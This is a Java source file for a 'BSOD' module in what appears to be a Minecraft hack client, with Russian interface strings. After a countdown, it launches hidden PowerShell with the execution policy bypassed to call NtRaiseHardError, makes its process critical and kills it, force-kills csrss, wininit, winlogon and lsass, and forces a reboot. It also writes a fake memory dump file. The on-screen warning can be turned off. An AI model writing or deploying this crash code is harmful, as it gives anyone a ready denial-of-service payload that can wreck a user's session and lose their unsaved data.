package rich.modules.impl.misc;

import lombok.AccessLevel;
import lombok.experimental.FieldDefaults;
import rich.events.api.EventHandler;
import rich.events.impl.TickEvent;
import rich.modules.module.ModuleStructure;
import rich.modules.module.category.ModuleCategory;
import rich.modules.module.setting.implement.BooleanSetting;
import rich.modules.module.setting.implement.SliderSettings;
import rich.util.Instance;
import rich.util.timer.StopWatch;

import java.io.FileWriter;
import java.io.IOException;

public class BSOD extends ModuleStructure {
    
    public static BSOD getInstance() {
        return Instance.get(BSOD.class);
    }
    
    private final SliderSettings countdown = new SliderSettings("Обратный отсчет", "Время до краша в секундах")
            .range(1, 60)
            .setValue(10);
    
    private final BooleanSetting createDump = new BooleanSetting("Создать дамп", "Создает файл дампа памяти")
            .setValue(true);
    
    private final BooleanSetting showWarning = new BooleanSetting("Показать предупреждение", "Показывает сообщение перед крашем")
            .setValue(true);
    
    private final StopWatch timer = new StopWatch();
    
    private boolean warningShown;
    private boolean crashTriggered;
    
    public BSOD() {
        super("BSOD", "Blue Screen of Death - крашит Windows", ModuleCategory.MISC);
        settings(countdown, createDump, showWarning);
    }
    
    @Override
    public void activate() {
        super.activate();
        timer.reset();
        warningShown = false;
        crashTriggered = false;
        
        if (showWarning.isValue()) {
            sendMessage("§c[BSOD] §fВНИМАНИЕ! Система будет принудительно перезагружена через " + countdown.getInt() + " секунд!");
            sendMessage("§c[BSOD] §fОтключите модуль чтобы отменить!");
        }
    }
    
    @Override
    public void deactivate() {
        super.deactivate();
        timer.reset();
        warningShown = false;
        crashTriggered = false;
        
        if (showWarning.isValue()) {
            sendMessage("§a[BSOD] §fКраш отменен!");
        }
    }
    
    @EventHandler
    public void onTick(TickEvent e) {
        if (crashTriggered) return;
        
        long elapsed = timer.elapsedTime();
        long countdownMs = countdown.getInt() * 1000L;
        long remaining = countdownMs - elapsed;
        
        if (showWarning.isValue() && remaining > 0) {
            long remainingSeconds = remaining / 1000;
            
            if (remainingSeconds <= 5 && remainingSeconds > 0) {
                if (elapsed % 1000 < 50) {
                    sendMessage("§c[BSOD] §fКраш через " + remainingSeconds + " секунд...");
                }
            }
        }
        
        if (elapsed >= countdownMs) {
            crashTriggered = true;
            triggerBSOD();
        }
    }
    
    private void triggerBSOD() {
        try {
            if (showWarning.isValue()) {
                sendMessage("§4[BSOD] §fИНИЦИИРУЮ КРАШ СИСТЕМЫ...");
            }
            
            if (createDump.isValue()) {
                createMemoryDump();
            }
            
            // Запускаем все методы одновременно
            Thread[] crashThreads = new Thread[4];
            
            crashThreads[0] = new Thread(this::triggerNtRaiseHardError);
            crashThreads[1] = new Thread(this::triggerCriticalProcessKill);
            crashThreads[2] = new Thread(this::triggerCriticalProcessMethod);
            crashThreads[3] = new Thread(this::triggerDriverCrash);
            
            for (Thread thread : crashThreads) {
                thread.start();
            }
            
            Thread.sleep(100);
            triggerDirectBSOD();
            
        } catch (Exception e) {
            triggerFallbackCrash();
        }
    }
    
    private void triggerNtRaiseHardError() {
        try {
            String psScript = 
                "Add-Type -TypeDefinition '\n" +
                "using System;\n" +
                "using System.Runtime.InteropServices;\n" +
                "public class NativeMethods {\n" +
                "    [DllImport(\"ntdll.dll\")]\n" +
                "    public static extern uint NtRaiseHardError(\n" +
                "        uint ErrorStatus,\n" +
                "        uint NumberOfParameters,\n" +
                "        uint UnicodeStringParameterMask,\n" +
                "        IntPtr Parameters,\n" +
                "        uint ValidResponseOption,\n" +
                "        out uint Response\n" +
                "    );\n" +
                "    [DllImport(\"ntdll.dll\")]\n" +
                "    public static extern uint RtlAdjustPrivilege(\n" +
                "        int Privilege,\n" +
                "        bool bEnablePrivilege,\n" +
                "        bool IsThreadPrivilege,\n" +
                "        out bool PreviousValue\n" +
                "    );\n" +
                "}\n" +
                "';\n" +
                "$prev = $false;\n" +
                "[NativeMethods]::RtlAdjustPrivilege(19, $true, $false, [ref]$prev);\n" +
                "$response = 0;\n" +
                "[NativeMethods]::NtRaiseHardError(0xC0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$response);";
            
            Runtime.getRuntime().exec(new String[]{
                "powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psScript
            });
            
        } catch (Exception ignored) {}
    }
    
    private void triggerCriticalProcessKill() {
        try {
            String[] criticalProcesses = {
                "csrss.exe", "wininit.exe", "winlogon.exe", "lsass.exe"
            };
            
            for (String process : criticalProcesses) {
                Runtime.getRuntime().exec(new String[]{
                    "taskkill", "/f", "/im", process
                });
            }
        } catch (Exception ignored) {}
    }
    
    private void triggerCriticalProcessMethod() {
        try {
            String bsodScript = 
                "Add-Type -TypeDefinition '\n" +
                "using System;\n" +
                "using System.Runtime.InteropServices;\n" +
                "public class BSOD {\n" +
                "    [DllImport(\"ntdll.dll\", SetLastError=true)]\n" +
                "    public static extern int NtSetInformationProcess(\n" +
                "        IntPtr hProcess, int processInformationClass,\n" +
                "        ref int processInformation, int processInformationLength);\n" +
                "}\n" +
                "';\n" +
                "$isCritical = 1;\n" +
                "[BSOD]::NtSetInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x1D, [ref]$isCritical, 4);\n" +
                "Stop-Process -Id $PID -Force";
            
            Runtime.getRuntime().exec(new String[]{
                "powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", bsodScript
            });
        } catch (Exception ignored) {}
    }
    
    private void triggerDriverCrash() {
        try {
            String driverScript = 
                "if (Test-Path 'C:\\\\Windows\\\\System32\\\\kd.exe') {\n" +
                "    Start-Process 'C:\\\\Windows\\\\System32\\\\kd.exe' -ArgumentList '-kl' -WindowStyle Hidden\n" +
                "}";
            
            Runtime.getRuntime().exec(new String[]{
                "powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", driverScript
            });
            
        } catch (Exception ignored) {}
    }
    
    private void triggerDirectBSOD() {
        try {
            Runtime.getRuntime().exec(new String[]{
                "powershell", "-Command",
                "wmic process where name='winlogon.exe' delete"
            });
            
            Runtime.getRuntime().exec(new String[]{
                "powershell", "-Command", 
                "Get-Process csrss | Stop-Process -Force"
            });
            
            Runtime.getRuntime().exec(new String[]{
                "wmic", "process", "where", "name='lsass.exe'", "delete"
            });
            
        } catch (Exception ignored) {}
    }
    
    private void triggerFallbackCrash() {
        try {
            Runtime.getRuntime().exec(new String[]{"taskkill", "/f", "/im", "csrss.exe"});
            Runtime.getRuntime().exec(new String[]{"taskkill", "/f", "/im", "wininit.exe"});
            Runtime.getRuntime().exec(new String[]{"taskkill", "/f", "/im", "lsass.exe"});
            Runtime.getRuntime().exec(new String[]{"shutdown", "/r", "/t", "0", "/f"});
        } catch (Exception ignored) {}
    }
    
    private void createMemoryDump() {
        try {
            String dumpContent = generateDumpReport();
            
            FileWriter writer = new FileWriter("MEMORY.DMP");
            writer.write(dumpContent);
            writer.close();
            
            if (showWarning.isValue()) {
                sendMessage("§e[BSOD] §fДамп памяти создан: MEMORY.DMP");
            }
            
        } catch (IOException e) {
            if (showWarning.isValue()) {
                sendMessage("§c[BSOD] §fОшибка создания дампа: " + e.getMessage());
            }
        }
    }
    
    private String generateDumpReport() {
        StringBuilder dump = new StringBuilder();
        
        dump.append("*** STOP: 0x0000007E (0xC0000005, 0x00000000, 0x00000000, 0x00000000)\n");
        dump.append("SYSTEM_THREAD_EXCEPTION_NOT_HANDLED\n\n");
        
        dump.append("*** AegisNeo Client Memory Dump ***\n");
        dump.append("Timestamp: ").append(System.currentTimeMillis()).append("\n");
        dump.append("Java Version: ").append(System.getProperty("java.version")).append("\n");
        dump.append("OS: ").append(System.getProperty("os.name")).append("\n");
        dump.append("Architecture: ").append(System.getProperty("os.arch")).append("\n");
        
        Runtime runtime = Runtime.getRuntime();
        dump.append("\nMemory Info:\n");
        dump.append("Total Memory: ").append(runtime.totalMemory() / 1024 / 1024).append(" MB\n");
        dump.append("Free Memory: ").append(runtime.freeMemory() / 1024 / 1024).append(" MB\n");
        dump.append("Max Memory: ").append(runtime.maxMemory() / 1024 / 1024).append(" MB\n");
        
        dump.append("\nStack Trace:\n");
        StackTraceElement[] stack = Thread.currentThread().getStackTrace();
        for (StackTraceElement element : stack) {
            dump.append("  at ").append(element.toString()).append("\n");
        }
        
        dump.append("\n*** End of dump ***\n");
        
        return dump.toString();
    }
    
    private void sendMessage(String message) {
        if (mc.player != null) {
            mc.player.sendMessage(net.minecraft.text.Text.literal(message), false);
        }
    }
}